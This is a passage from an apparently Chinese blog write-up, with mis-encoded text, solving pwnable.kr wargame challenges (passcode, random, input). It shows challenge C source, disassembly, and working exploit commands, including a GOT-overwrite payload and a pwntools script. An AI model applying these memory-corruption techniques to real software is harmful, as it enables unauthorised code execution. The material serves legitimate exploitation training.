function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome %s!\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Toddler's Secure Login System 1.0 beta.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// something after login...</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now I can safely trust you that you have credential :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-4"><a href="#ÂàÜÊûê-4" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Âà©Áî® scp ÊääÈ¢òÁõÆÊã∑‰∏ãÊù•</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/tools/die_lin64_portable$ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode ./passcode@pwnable.kr's password: passcode                                          100% 7485     7.3KB/s   00:01</code></pre><p>ÂÜçÊù•Ê£ÄÊµã‰∏ãÁ®ãÂ∫èÂºÄÂêØ‰∫ÜÂì™‰∫õ‰øùÊä§Êé™ÊñΩÔºåÊ≥®ÊÑèÂà∞ PIE Ê≤°ÊúâÂºÄÂêØ</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ checksec passcode [*] '/home/pwn/Ê°åÈù¢/passcode'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>ÂõûÂà∞‰ª£Á†ÅÔºåÊ≥®ÊÑèÂà∞<code>scanf(&quot;%d&quot;, passcode1);</code>ËøôÊÆµ‰ª£Á†ÅÊòØÊúâÈóÆÈ¢òÁöÑÔºåÈ¶ñÂÖàËÄÉËôëÁõ¥Êé•Ê∫¢Âá∫Ë¶ÜÁõñpasscode1 ‰ª•Âèä passcode2Ôºå338150 == 0x000528e6Â∑≤ÁªèÂá∫Áé∞‰∫Ü0x00Êà™Êñ≠ÔºåÂõ†Ê≠§Êó†Ê≥ïÂÆûÁé∞ÂèòÈáèË¶ÜÁõñ</p><p>ÈÇ£‰πàÁõ¥Êé•Ë¶ÜÁõñRETÂë¢ÔºüÊ≥®ÊÑèÂà∞ÂºÄÂêØ‰∫Ü CanaryÔºåÈúÄË¶ÅÁªïËøáÔºåÊöÇÊó∂‰∏ç‰ºö:(</p><p>‰ΩÜÊòØÊ≥®ÊÑèÂà∞ PIE Ê≤°ÊúâÂºÄÂêØÔºåËÄå‰∏îpasscode1ÂâçÈù¢Ê≤°ÊúâÂèñÂú∞ÂùÄÁ¨¶Âè∑<code>&amp;</code>ÔºåÊàë‰ª¨ÂèØ‰ª•Ë¶ÜÁõñÂÜÖÂ≠òÂú∞ÂùÄ‰∏∫passcode1ÁöÑÊï∞ÊçÆÂÜÖÂÆπ</p><p>ËøôÊ†∑Êàë‰ª¨ÈÄöËøáÂ∞Ü passcode1 ËÆæÁΩÆ‰∏∫ fflush ÁöÑ GOT Ë°®ÂçïÔºåÈÄöËøá scanf Â∞ÜË∞ÉÁî®Âú∞ÂùÄÊåáÂêë <code>system(&quot;/bin/cat flag&quot;);</code> ËææÊàêÁªïËøáËÆ§ËØÅËé∑Âèñ flagÔºåÂ§ßËá¥Ê≠•È™§Â¶Ç‰∏ãÔºö</p><ol><li><p>‰ªé name Âà∞ passcode1 ÁöÑÈïøÂ∫¶‰∏∫ (ebp+0x70) - (ebp-0x10) = 0x80 == 96</p></li><li><p>Áúã‰∏Ä‰∏ã fflush ÁöÑ GOT Âú∞ÂùÄ‰∏∫0x0804a004</p><pre class=" language-shell"><code class="language-shell"> pwn@pwn-Parallels-Virtual-Platform:~/Ê°åÈù¢$ objdump -R passcode  passcodeÔºö     Êñá‰ª∂Ê†ºÂºè elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET   TYPE              VALUE  08049ff0 R_386_GLOB_DAT    __gmon_start__ 0804a02c R_386_COPY        stdin@@GLIBC_2.0 0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0 0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0 0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4 0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0 0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0 0804a014 R_386_JUMP_SLOT   __gmon_start__ 0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0 0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0 0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7</code></pre></li><li><p>ÂÜçÈÄöËøá gdb Êü•Áúã <code>system(&quot;/bin/cat flag&quot;);</code> ÂºÄÂßãË∞ÉÁî®ÁöÑÊåá‰ª§Âú∞ÂùÄ‰∏∫ 0x080485e3ÔºåÂêåÊó∂Ê≥®ÊÑèÂà∞scanf ‰º†ÂèÇÊó∂‰∏∫<code>%d</code>ÔºåÊâÄ‰ª•ÈúÄË¶ÅËΩ¨Êç¢Êàê int ÂûãÊï∞ÊçÆ</p><pre class=" language-armasm"><code class="language-armasm"> (gdb) disassemble login Dump of assembler code for function login:    0x08048564 <+0>:     push   %ebp    0x08048565 <+1>:     mov    %esp,%ebp    0x08048567 <+3>:     sub    $0x28,%esp    0x0804856a <+6>:     mov    $0x8048770,%eax    0x0804856f <+11>:    mov    %eax,(%esp)    0x08048572 <+14>:    call   0x8048420 <printf@plt>    0x08048577 <+19>:    mov    $0x8048783,%eax    0x0804857c <+24>:    mov    -0x10(%ebp),%edx    0x0804857f <+27>:    mov    %edx,0x4(%esp)    0x08048583 <+31>:    mov    %eax,(%esp)    0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>    0x0804858b <+39>:    mov    0x804a02c,%eax    0x08048590 <+44>:    mov    %eax,(%esp)    0x08048593 <+47>:    call   0x8048430 <fflush@plt>    0x08048598 <+52>:    mov    $0x8048786,%eax    0x0804859d <+57>:    mov    %eax,(%esp)    .    .    .    0x080485d7 <+115>:   movl   $0x80487a5,(%esp)    0x080485de <+122>:   call   0x8048450 <puts@plt>    0x080485e3 <+127>:   movl   $0x80487af,(%esp)    0x080485ea <+134>:   call   0x8048460 <system@plt>    0x080485ef <+139>:   leave      0x080485f0 <+140>:   ret        0x080485f1 <+141>:   movl   $0x80487bd,(%esp)    0x080485f8 <+148>:   call   0x8048450 <puts@plt>    0x080485fd <+153>:   movl   $0x0,(%esp)    0x08048604 <+160>:   call   0x8048480 <exit@plt> End of assembler dump.</code></pre></li></ol><h3 id="Ëß£È¢ò-4"><a href="#Ëß£È¢ò-4" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">passcode@pwnable:~$ python -c "print 'A' * 96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcodeToddler's Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩ!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :)</code></pre><h2 id="6-random"><a href="#6-random" class="headerlink" title="6. random"></a>6. random</h2><h3 id="È¢òÁõÆ-5"><a href="#È¢òÁõÆ-5" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> random<span class="token punctuation">;</span>    random <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// random value!</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>key <span class="token operator">^</span> random<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xdeadbeef</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong, maybe you should try 2^32 cases.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-5"><a href="#ÂàÜÊûê-5" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Âõ†‰∏∫Áõ¥Êé• random ‰∏∫‰º™ÈöèÊú∫ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÁü•ÈÅìÁ®ãÂ∫è‰∏≠ÁîüÊàêÁöÑÂÄºÊòØÂ§öÂ∞ëÂ∞±ÂèØ‰ª•Áõ¥Êé•ÊãøÊù•Âà©Áî®‰∫Ü</p><pre class=" language-armasm"><code class="language-armasm">pwndbg> disassemble mainDump of assembler code for function main:   0x00000000004005f4 <+0>:   push   rbp   0x00000000004005f5 <+1>:   mov    rbp,rsp   0x00000000004005f8 <+4>:   sub    rsp,0x10   0x00000000004005fc <+8>:   mov    eax,0x0   0x0000000000400601 <+13>:  call   0x400500 <rand@plt>   0x0000000000400606 <+18>:  mov    DWORD PTR [rbp-0x4],eax   0x0000000000400609 <+21>:  mov    DWORD PTR [rbp-0x8],0x0   0x0000000000400610 <+28>:  mov    eax,0x400760   0x0000000000400615 <+33>:  lea    rdx,[rbp-0x8]   0x0000000000400619 <+37>:  mov    rsi,rdx   0x000000000040061c <+40>:  mov    rdi,rax   0x000000000040061f <+43>:  mov    eax,0x0   0x0000000000400624 <+48>:  call   0x4004f0 <__isoc99_scanf@plt>   0x0000000000400629 <+53>:  mov    eax,DWORD PTR [rbp-0x8]   0x000000000040062c <+56>:  xor    eax,DWORD PTR [rbp-0x4]   0x000000000040062f <+59>:  cmp    eax,0xdeadbeef   0x0000000000400634 <+64>:  jne    0x400656 <main+98>   0x0000000000400636 <+66>:  mov    edi,0x400763   0x000000000040063b <+71>:  call   0x4004c0 <puts@plt>   0x0000000000400640 <+76>:  mov    edi,0x400769   0x0000000000400645 <+81>:  mov    eax,0x0   0x000000000040064a <+86>:  call   0x4004d0 <system@plt>   0x000000000040064f <+91>:  mov    eax,0x0   0x0000000000400654 <+96>:  jmp    0x400665 <main+113>   0x0000000000400656 <+98>:  mov    edi,0x400778   0x000000000040065b <+103>: call   0x4004c0 <puts@plt>   0x0000000000400660 <+108>: mov    eax,0x0   0x0000000000400665 <+113>: leave     0x0000000000400666 <+114>: ret    End of assembler dump.</code></pre><p>ÂèØ‰ª•Á°ÆËÆ§ random Â≠òÂú® rbp-0x4ÔºåËæìÂÖ•ÂÄºÂ≠òÂú® rbp-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15909964922295.jpg" alt></p><p>Ê≥®ÊÑèÂ∞èÁ´ØÂ≠òÂÇ®ÔºåÊâÄ‰ª• random=0x6b8b4567</p><p>ËæìÂÖ•ÂÄºÔºö0x6b8b4567 ^ 0xdeadbeef = 3039230856</p><h3 id="Ëß£È¢ò-5"><a href="#Ëß£È¢ò-5" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-shell"><code class="language-shell">random@pwnable:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable...</code></pre><h2 id="7-input"><a href="#7-input" class="headerlink" title="7. input"></a>7. input</h2><h3 id="È¢òÁõÆ-6"><a href="#È¢òÁõÆ-6" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;arpa/inet.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// argv</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// stdio</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// env</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// file</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// network</span>    <span class="token keyword">int</span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> sockaddr_in saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>    sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>    saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>saddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr_in<span class="token punctuation">)</span><span class="token punctuation">;</span>    cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> sockaddr <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// here's your flag</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-6"><a href="#ÂàÜÊûê-6" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>‰∏ÄÂÖ±Êúâ 5 ÂÖ≥Ôºö</p><ol><li>‰º†ÂÖ• 100 ‰∏™ÂèÇÊï∞ÔºåÂèÇÊï∞ ‚ÄòA‚Äô(65) ‰∏∫ <code>\x00</code> ÂèÇÊï∞ ‚ÄòB‚Äô(66) ‰∏∫ <code>\x20\x0a\x0d</code></li><li>‰ªé stdin ‰∏≠ËØªÂèñËæìÂÖ• <code>\x00\x0a\x00\xff</code>Ôºåstderr ‰∏≠ËØªÂèñËæìÂÖ•<code>\x00\x0a\x02\xff</code></li><li>‰ªéÁéØÂ¢ÉÂèòÈáèÂéªËØª<code>\xde\xad\xbe\xef</code>ÔºåÈúÄË¶ÅÂÄº‰∏∫<code>\xca\xfe\xba\xbe</code></li><li>ËØªÂΩìÂâçÁõÆÂΩï‰∏ã<code>\x0a</code>Êñá‰ª∂ÔºåÂâç 4 ‰∏™Â≠óËäÇÈúÄË¶Å‰∏∫<code>\x00\x00\x00\x00</code></li><li>ËØªÂèñÂèÇÊï∞ ‚ÄòC‚Äô(67) ‰∏∫Á´ØÂè£ÂÄºÔºåÂèëÈÄÅ<code>b</code>Ëá≥Ê≠§Á´ØÂè£</li></ol><h3 id="Ëß£È¢ò-6"><a href="#Ëß£È¢ò-6" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> sleepconn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"input2"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stdin"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"/tmp/sa/stderr"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>write<span class="token punctuation">(</span>b<span class="token string">"/tmp/sa/\x0a"</span><span class="token punctuation">,</span> b<span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"."</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x00"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">"\x20\x0a\x0d"</span>args<span class="token punctuation">[</span>ord<span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"47362"</span>envs <span class="token operator">=</span> <span class="token punctuation">{</span>b<span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">:</span>b<span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">}</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>args<span class="token punctuation">,</span> cwd<span class="token operator">=</span><span class="token string">"/tmp/sa/"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>envs<span class="token punctuation">,</span> executable<span class="token operator">=</span><span class="token string">"/home/input2/input"</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token string">"/tmp/stdin"</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token string">"/tmp/stderr"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sock <span class="token operator">=</span> conn<span class="token punctuation">.</span>remote<span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">47362</span><span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ÊâßË°åÁªìÊûúÔºö</p><pre class=" language-shell"><code class="language-shell">pwn@pwn-Parallels-Virtual-Platform:~/pwnable.kr$ /usr/bin/python3 /home/pwn/pwnable.kr/7_input.py[+] Connecting to pwnable.kr on port 2222: Done[*] input2@pwnable.kr:    Distro    Ubuntu 16.04    OS:       linux    Arch:     amd64    Version:  4.4.179    ASLR:     Enabled[+] Starting remote process '/home/input2/input' on pwnable.kr: pid 145635[*] Switching to interactive modeWelcome to pwnable.krLet's see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy! I learned how to pass various input in Linux :)[*] Got EOF while reading in interactive</code></pre><h2 id="8-leg"><a href="#8-leg" class="headerlink" title="8. leg"></a>8. leg</h2><h3 id="È¢òÁõÆ-7"><a href="#È¢òÁõÆ-7" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token 